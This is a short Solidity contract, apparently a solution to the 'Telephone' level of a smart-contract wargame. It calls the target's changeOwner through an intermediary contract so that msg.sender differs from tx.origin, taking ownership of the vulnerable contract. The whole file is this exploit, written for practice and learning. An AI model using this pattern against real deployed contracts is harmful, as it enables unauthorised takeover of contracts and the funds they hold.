// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

import "./telephone.sol";

contract TelephoneAttack {
    
    address public owner;
    Telephone public telephone;

    constructor (Telephone _telephone) public {
        telephone = Telephone (_telephone);
        owner = msg.sender;
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }

}
